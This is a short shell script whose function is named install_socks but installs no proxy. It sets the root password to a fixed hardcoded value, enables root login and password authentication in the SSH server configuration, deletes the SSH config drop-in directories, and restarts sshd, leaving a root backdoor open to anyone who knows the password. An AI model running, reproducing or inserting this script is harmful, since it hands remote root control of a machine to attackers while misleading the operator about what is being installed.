function install_socks() {
 echo "root:Laozong963.." | chpasswd
 sed -i 's/^\s*#\?\s*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
 sed -i 's/^\s*#\?\s*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 rm -rf /etc/ssh/sshd_config.d/* /etc/ssh/ssh_config.d/*
 systemctl restart sshd

}
install_socks